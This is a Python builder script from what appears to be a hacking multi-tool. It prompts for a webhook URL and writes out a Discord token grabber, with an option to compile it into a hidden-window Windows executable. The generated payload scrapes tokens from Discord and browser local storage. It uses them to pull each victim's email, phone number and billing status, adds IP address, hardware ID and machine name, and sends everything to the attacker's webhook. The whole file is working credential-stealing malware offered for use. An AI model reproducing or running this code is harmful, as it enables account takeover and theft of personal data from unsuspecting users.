from colorama import Fore
import time, sys, os, shutil
from util.plugins.commun import * 

def tokengrabber():
    setTitle("File Grabber")
    def spinner():
        l = ['|', '/', '-', '\\']
        for i in l+l:
            sys.stdout.write(f"""\r{y}[{b}#{y}]{w} Creating File... {i}""")
            sys.stdout.flush()
            time.sleep(0.2)
        print('\n')
        for i in l+l+l+l:
            sys.stdout.write(f"""\r{y}[{b}#{y}]{w} Writing File... {i}""")
            sys.stdout.flush()
            time.sleep(0.2)

    clear()
    filegrabbertitle()
    print(f"{y}[{w}+{y}]{w} Enter the name you want to give to the final file: ")
    global filename
    fileName = str(input(f"{y}[{b}#{y}]{w} File name: "))
    print(f"""\n\n{y}[{w}+{y}]{w} Enter your WebHook to generate a Token Grabber containing it: """)
    global webhooklink
    webhooklink = str(input(f"{y}[{b}#{y}]{w} Webhook Link: "))
    print('\n')
    spinner()

    try:
        with open(f"output/{fileName}.py", "w") as file:
            file.write("""import os
if os.name != "nt":
    exit()
from re import findall
from json import loads, dumps
from base64 import b64decode
from subprocess import Popen, PIPE
from urllib.request import Request, urlopen
from datetime import datetime
from threading import Thread
from time import sleep
from sys import argv
LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
PATHS = {
    "Discord"           : ROAMING + "\\\\Discord",
    "Discord Canary"    : ROAMING + "\\\\discordcanary",
    "Discord PTB"       : ROAMING + "\\\\discordptb",
    "Google Chrome"     : LOCAL + "\\\\Google\\\\Chrome\\\\User Data\\\\Default",
    "Opera"             : ROAMING + "\\\\Opera Software\\\\Opera Stable",
    "Brave"             : LOCAL + "\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Default",
    "Yandex"            : LOCAL + "\\\\Yandex\\\\YandexBrowser\\\\User Data\\\\Default"
}
def getheaders(token=None, content_type="application/json"):
    headers = {
        "Content-Type": content_type,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
    }
    if token:
        headers.update({"Authorization": token})
    return headers
def getuserdata(token):
    try:
        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getheaders(token))).read().decode())
    except:
        pass
def gettokens(path):
    path += "\\\\Local Storage\\\\leveldb"
    tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
            continue
        for line in [x.strip() for x in open(f"{path}\\\\{file_name}", errors="ignore").readlines() if x.strip()]:
            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                for token in findall(regex, line):
                    tokens.append(token)
    return tokens
def getip():
    ip = "None"
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except:
        pass
    return ip
def getavatar(uid, aid):
    url = f"https://cdn.discordapp.com/avatars/{uid}/{aid}.gif"
    try:
        urlopen(Request(url))
    except:
        url = url[:-4]
    return url
def gethwid():
    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
    return (p.stdout.read() + p.stderr.read()).decode().split("\\n")[1]
def getchat(token, uid):
    try:
        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/channels", headers=getheaders(token), data=dumps({"recipient_id": uid}).encode())).read().decode())["id"]
    except:
        pass
def has_payment_methods(token):
    try:
        return bool(len(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=getheaders(token))).read().decode())) > 0)
    except:
        pass
def send_message(token, chat_id, form_data):
    try:
        urlopen(Request(f"https://discordapp.com/api/v6/channels/{chat_id}/messages", headers=getheaders(token, "multipart/form-data; boundary=---------------------------325414537030329320151394843687"), data=form_data.encode())).read().decode()
    except:
        pass
def main():
    cache_path = ROAMING + "\\\\.cache~$"
    embeds = []
    working = []
    checked = []
    already_cached_tokens = []
    working_ids = []
    ip = getip()
    pc_username = os.getenv("UserName")
    pc_name = os.getenv("COMPUTERNAME")
    for platform, path in PATHS.items():
        if not os.path.exists(path):
            continue
        for token in gettokens(path):
            if token in checked:
                continue
            checked.append(token)
            uid = None
            if not token.startswith("mfa."):
                try:
                    uid = b64decode(token.split(".")[0].encode()).decode()
                except:
                    pass
                if not uid or uid in working_ids:
                    continue
            user_data = getuserdata(token)
            if not user_data:
                continue
            working_ids.append(uid)
            working.append(token)
            username = user_data["username"] + "#" + str(user_data["discriminator"])
            user_id = user_data["id"]
            avatar_id = user_data["avatar"]
            avatar_url = getavatar(user_id, avatar_id)
            email = user_data.get("email")
            phone = user_data.get("phone")
            nitro = bool(user_data.get("premium_type"))
            billing = bool(has_payment_methods(token))
            embed = {
                "color": 0x7289da,
                "fields": [
                    {
                        "name": "**Account Info**",
                        "value": f'Email: {email}\\nPhone: {phone}\\nNitro: {nitro}\\nBilling Info: {billing}',
                        "inline": True
                    },
                    {
                        "name": "**PC Info**",
                        "value": f'IP: {ip}\\nUsername: {pc_username}\\nPC Name: {pc_name}\\nToken Location: {platform}',
                        "inline": True
                    },
                    {
                        "name": "**Token**",
                        "value": token,
                        "inline": False
                    }
                ],
                "author": {
                    "name": f"{username} ({user_id})",
                    "icon_url": avatar_url
                },
                "footer": {
                
                }
            }
            embeds.append(embed)
    with open(cache_path, "a") as file:
        for token in checked:
            if not token in already_cached_tokens:
                file.write(token + "\\n")
    if len(working) == 0:
        working.append('123')
    webhook = {
        "content": "",
        "embeds": embeds,
        "username": "Discord Token Grabber",
        "avatar_url": "https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
    }
    try:
        urlopen(Request("~~TOKENURLHERE~~", data=dumps(webhook).encode(), headers=getheaders()))
    except:
        pass

main()""".replace("~~TOKENURLHERE~~", webhooklink))

    except Exception as e:
        print(f"""\n\n\n\n{y}[{Fore.LIGHTRED_EX }!{y}]{w}  Error writing file: {e}""")
        os.system(2)
        clear()
        main()

    print(f"""\n\n\n{y}[{Fore.LIGHTGREEN_EX }!{y}]{w} File has been correctly written to "output/{fileName}.py" """)
    convert = input(f"""{y}[{b}#{y}]{w} Convert your script into an executable (Y/N) ? """)
    if convert.upper() == 'Y' or convert.upper() == 'YES':
        try:
            time.sleep(1)
            clear()

            print(f'{y}[{b}#{y}]{w} File creation...')
            time.sleep(1)
            os.system(f"pyinstaller -y -F -w output/{fileName}.py")
            clear()
            print(f'{y}[{b}#{y}]{w} Cleaning up old files...')
            time.sleep(1)
            try:
                import shutil
                os.remove(f"{fileName}.spec")
                shutil.rmtree(f"build")
                shutil.move(f"dist/{fileName}.exe", "output")
                shutil.rmtree(f"dist")
                time.sleep(1)
            except:
                pass
            clear()
            filegrabbertitle()
            print(f"{y}[{Fore.LIGHTGREEN_EX }!{y}]{w} The executable file has been correctly generated")
        except:
            clear()
            filegrabbertitle()
            print(f"{y}[{Fore.LIGHTGREEN_EX }!{y}]{w} The executable file has been correctly generated")
            
        input(f"{y}[{b}#{y}]{w} Press ENTER to exit")
    else:
        input(f"{y}[{b}#{y}]{w} Press ENTER to exit")
    main()

tokengrabber()
